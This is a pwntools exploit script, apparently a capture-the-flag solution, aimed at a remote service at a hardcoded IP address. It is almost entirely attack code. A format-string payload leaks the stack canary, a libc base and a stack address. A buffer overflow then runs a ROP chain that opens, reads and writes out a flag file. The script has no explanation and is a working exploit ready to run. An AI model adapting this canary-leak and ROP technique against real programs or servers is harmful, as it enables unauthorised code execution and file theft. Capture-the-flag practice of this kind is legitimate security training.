from pwn import *
context(log_level='debug',os='linux',arch='amd64')

#p = process("./1")
p=remote('59.110.164.72',10066)
# gdb.attach(p,"b *0x4007ab")
# pause()
elf=ELF('./1')
libc=ELF('./libc.so.6')
rdi = 0x400a23
rsi = 0x400a21
jmp_rax = 0x4006f1
r12 =0x400a1a

payload1 = b"\x39\x39%9$p%15$p%10$p"
p.sendafter(b"This is a larger box\n",payload1)
payload2 =b"./flag.txt\x00\x00\x00".ljust(0x20,b"a")
p.sendafter(b"We have a lot to talk about\n",payload2)


p.recv(2)
canary = int(p.recv(18),16)
print ("cananr -->",canary)

libc_base = int(p.recv(14),16)-0x20840
print("libc_base -->",hex(libc_base))

stack_addr =int(p.recv(14),16)-0x80
print ("stack-->",hex(stack_addr))
open = libc_base +libc.sym['open']
write_addr= libc_base +libc.sym['write']
read_addr= libc_base +libc.sym['read']

payload3 = b"\x39\x39\x00\x00\x00\x00\x00\x00"
p.sendlineafter(b"This is a larger box\n",payload3)
payload4 =b"./flag\x00\x00\x00\x00\x00\x00\x00".ljust(0x28,b"a")+p64(canary)+p64(0)+p64(rdi)+p64(stack_addr)+\
    p64(rsi)+p64(0)*2+p64(open)+p64(rdi)+p64(3)+p64(rsi)+p64(0x601500)*2+\
    p64(read_addr)+p64(rdi)+p64(1)+p64(rsi)+p64(0x601500)*2+p64(write_addr)
p.sendafter(b"We have a lot to talk about\n",payload4)




p.interactive()